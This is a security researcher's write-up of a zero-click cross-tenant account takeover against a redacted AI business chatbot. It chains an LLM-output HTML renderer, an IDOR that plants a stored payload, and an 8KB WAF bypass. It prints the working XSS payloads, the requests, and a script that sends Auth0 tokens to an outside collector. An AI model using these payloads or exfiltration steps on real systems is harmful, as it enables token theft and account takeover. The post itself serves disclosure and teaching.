---
title: "How I Made an AI Steal Session Tokens for Me | Zero-Click Cross-Tenant ATO via LLM Output Rendering + IDOR"
date: 2026-06-08 12:00:00 -03
categories: [ai-security]
tags: [ai-security, xss, stored-xss, idor, account-takeover]
image: /assets/img/Posts/llm-blog.png
---

# How I made a company's own AI assistant steal its users' session tokens, zero-click

I want to tell you about the moment I realized I could make a company's own AI assistant hand me its users' session tokens. No phishing link. No social engineering. No malicious click. Just a normal user opening the chat they already use every day and asking it a perfectly normal question.

This is the story of how a custom rendering quirk in the chatbot, plus a forgotten IDOR on a completely different microservice, chained into a **stored, zero-click, cross-tenant Account Takeover**. Severity: **Critical**.

```
┌──────────────────────────Summary───────────────────────────┐
│                                                            │
│  1. The Chatbot That Wrote Its Own HTML                    │
│     - Discovering the colon-DSL renderer                   │
│  2. Confirming The Sink                                    │
│     - From colon-DSL to alert(1)                           │
│  3. The IDOR On Another Microservice                       │
│     - Cross-tenant write, no ownership check               │
│  4. The Chain: Planting A Stored Payload                   │
│  5. Building The Exfil (Auth0 + ngrok + OAST)              │
│  6. The 8KB WAF Bypass                                     │
│  7. Impact                                                 │
│                                                            │
└────────────────────────────────────────────────────────────┘
```

---

# Section 1 — The Chatbot That Wrote Its Own HTML

The target was an AI-powered business management dashboard. Property management, files, financials, all wrapped in a conversational interface. You ask the AI about your business, it answers.

My first instinct whenever I see an AI feature in scope is always the same: **what does the frontend do with the model's response?** Most of the time the answer is boring, it just renders Markdown. But sometimes developers get creative. And creative is dangerous.

So I opened DevTools, started chatting, and watched the DOM mutate in real time. After a few minutes I noticed the model's answers were converting :WORD[] into tags in the HTML output.

A **DSL renderer** sitting right on the chat output stream. It parsed a colon-prefixed mini-language and converted it into **real HTML nodes** that it injected into the DOM.

Once I had a few examples I worked out the grammar. It was simple:

```
:tag[ inner content ]{ attributes and event handlers }
```

Which the renderer turned into:

```html
<tag attributes and event handlers> inner content </tag>
```

So:

- `:iframe[]{srcdoc='...'}` → `<iframe srcdoc='...'></iframe>`
- `:button[Click here]{action='...'}` → `<button action='...'>Click here</button>`

Whatever sat inside `[]` became the element's content; whatever sat inside `{}` became its **attributes and event handlers**. The renderer was building HTML elements out of text, and the text it was building them from was the **LLM's own answer**.

<img src="/assets/img/Posts/chatbot-document-interaction.png">

My first thought: that is a dangerously powerful primitive to point at untrusted text.

My second thought: is the LLM's output considered untrusted here?


---

# Section 2 — Confirming The Sink

The renderer's grammar made the exploit obvious. If I could get the model to *echo* a colon-DSL string back to me with a payload, the frontend would faithfully turn it into HTML and execute whatever event handler I wrote.

The catch: if the model wraps the string in backticks (a code block), the renderer treats it as literal text and skips it. So I asked the model explicitly to return the payload with no backticks, just raw text:

```http
POST /files/chat HTTP/1.1
Host: data-gpt-gw.redacted.com
Authorization: Bearer <attacker_token>
Accept: text/event-stream
Content-Type: application/json

{
  "a": "<8KB of 'a' characters>",
  "prompt": "... system prompt ...",
  "question": "Return only the text below, with no backticks: :iframe[]{srcdoc='<svg onload=alert(1)>'}",
  "agent": true,
  "streaming": true
}
```

The stream came back. The renderer parsed it. An `<iframe>` materialized in the DOM, the SVG `onload` fired, and:

```
alert(1)
```

**XSS confirmed.**

At this point, the victim would have to send that exact crafted question themselves for the payload to land in their session. That is a real bug, but it still **not zero-click**.

I wanted the payload to reach the victim's renderer without them typing anything malicious at all. For that, I needed to get my colon-DSL into data the model would read and echo on its own.

---

# Section 3 — The IDOR On Another Microservice

While I was probing the chat (`data-gpt-gw.redacted.com`), I was running a parallel recon pass on the rest of the API surface. The business data lived on a *different* microservice: `room-gw.redacted.com`. One endpoint there caught my eye:

```
PUT /properties/{id}
```

The body let you update a business record, name, asking price, metadata. And the `{id}` in the URL was a plain **sequential integer**. I was logged in as Account A, editing my own property ID `4148`. Out of pure habit, I changed it to `4149`, a property belonging to a completely different tenant, and sent the request.

```
200 OK
```

No ownership check. No tenant validation. The server happily updated **another tenant's** business record using *my* Bearer token. A textbook **IDOR**.

On its own, this was already reportable. But the moment I saw that I could write arbitrary text into *another user's business name*, the chatbot quirk from Section 1 clicked into place.

The business name is **stored**. I can **write it**. The model **reads it and echoes it back**. The frontend **renders whatever the model says as HTML.**


---

# Section 4 — The Chain: Planting A Stored Payload in the victim's business information

Here's the insight. The AI assistant is *designed* to talk about your business. Ask it "what's on the calendar for this business?" and it reaches into the data layer, pulls the business name, and drops it into its answer.

So if the victim's business name **is** a colon-DSL XSS payload, then the moment the victim asks the assistant any normal question that includes the name, the renderer turns that name into live HTML, in the victim's browser, in the victim's origin.

I used the IDOR to overwrite the victim's business name with a colon-DSL payload. The PoC `alert(1)` proved the sink, but for a real token theft I didn't want to cram a full exfil routine into the stored field. Instead I made the stored payload tiny: an iframe whose `onload` pulls in a **second-stage JavaScript file** from a server I control.

```http
PUT /properties/4149 HTTP/1.1
Host: room-gw.redacted.com
Authorization: Bearer <attacker_token>
Content-Type: application/json

{
  "a": "<8KB of 'a' characters to bypass the WAF>",
  "name": ":iframe[]{srcdoc='<svg onload=import(\"https://<id>.ngrok-free.app/m3.js\")>'}",
  "asking_price": 1111,
  "year_built": 1990,
  "multifamily_data": {"units": 1}
}
```

Why an `<iframe srcdoc>`? The application WAF was blocking normal events, however, by using `srcdoc` iframe, I was able to bypass it. The script running inside it is same-origin with the application, which means it can read the app's `localStorage` directly. And why `import()` instead of inlining everything? Two reasons: it kept the stored field small, and it let me iterate on the exfil logic without re-firing the IDOR every time. 

The server stored the payload as the victim's business name.

<img src="/assets/img/Posts/idor-properties.png">

---

# Section 5 — Building The Exfil (Auth0 + ngrok + OAST)

Now the second stage. I needed to know exactly where the app kept its session material. A quick look at the victim origin's `localStorage` answered it: the app used the **Auth0 SPA SDK**, which caches the tokens under a key like this:

```
@@auth0spajs@@::rSNYbABPTeOOqwktxpd1::https://api.redacted.com::openid profile email
```

That entry holds the access token, valid for **30 days**. So my second-stage `m3.js` was as simple as: read that key, beacon it out to an out-of-band domain I control.

```js
// m3.js — second stage, runs same-origin in the victim's session
var testm3 = localStorage.getItem(
  "@@auth0spajs@@::rSNYbABPTeOOqwktxpd1::https://api.redacted.com::openid profile email"
);
fetch("https://cnwcpqbaomhtafemtgpcn6cfaj9jrbxgy.oast.fun/?x=" + testm3);
```

I used an **OAST / interactsh** domain (`oast.fun`).

To serve `m3.js`, I hosted it locally and tunneled it out with ngrok. The one non-obvious detail: because the payload loads the script via dynamic `import()`, the browser enforces **CORS** on the fetch. So the tunnel has to return an `Access-Control-Allow-Origin` header, otherwise the import silently fails:

```bash
# In the folder containing m3.js, serve it:
python3 -m http.server 8888

# Tunnel it out WITH the CORS header import() requires:
ngrok http 8888 --response-header-add="Access-Control-Allow-Origin:*"
```

## The Exploitation Steps

With all of that in place, the full sequence was:

1. I overwrote the victim's business name with the colon-DSL iframe payload (via the IDOR).
2. The victim logged in normally and opened the AI chat.
3. The victim asked something ordinary, like *"show me the calendar for this business."*
4. The model pulled the (malicious) business name and echoed it into its answer.
5. The colon-DSL renderer turned it into a live `<iframe srcdoc>`; the SVG `onload` fired and `import()`ed `m3.js` from my ngrok tunnel.
6. `m3.js` ran same-origin, read the Auth0 token from `localStorage`, and beaconed it to my `oast.fun` collector.

My interaction log lit up:

```
GET /?x=<...Auth0 access token...>
```

The victim's 30-day token, in my hands. The victim did nothing but ask a normal question.

<img src="/assets/img/Posts/llm-ato-chain.png">

So the victim screen should return something like ( acting as the victim ):

<img src="/assets/img/Posts/ato-chat-response.png">

---

# Section 6 — The 8KB WAF Bypass

One detail you'll have noticed in both requests: an ~8KB junk field under the key `"a"`, filled with repeated characters.

Both the `/files/chat` request on `data-gpt-gw.redacted.com` and the `/properties` update on `room-gw.redacted.com` only reached the vulnerable code path when the JSON body was padded to roughly 8KB. Otherwise, the WAF just blocked the request.

Some WAF configurations only inspect a limited portion of an HTTP request body, so an attacker can place a large amount of harmless data at the beginning of the request and move the malicious payload beyond the inspection boundary. 

The WAF sees only the benign content and allows the request to pass, while the backend application still processes the entire body, including the hidden payload.

For more information, check [Bypassing waf protection 8kb](https://kloudle.com/blog/bypassing-the-aws-waf-protection-with-an-8kb-bullet/)

---

# Section 7 — Impact

- Any attacker with a free account could compromise **any other user's account**, across tenants.
- **Zero-click.** The victim only had to open the chat and ask normal questions about their business and deals informations.
- The victim's **30-day Auth0 access token** ends up in the attacker's out-of-band logs.
- With that token: read and modify sensitive business data, act as the victim, pivot to other organizations, and persist for up to a month until tokens rotate.
- Tenant isolation


# Final Thoughts

Sometimes your attack vector might be simple, pay attention to the basics and strange behaviours in the application, they might be doing dangerous conversions.

Happy hacking.

---

# Thank you !

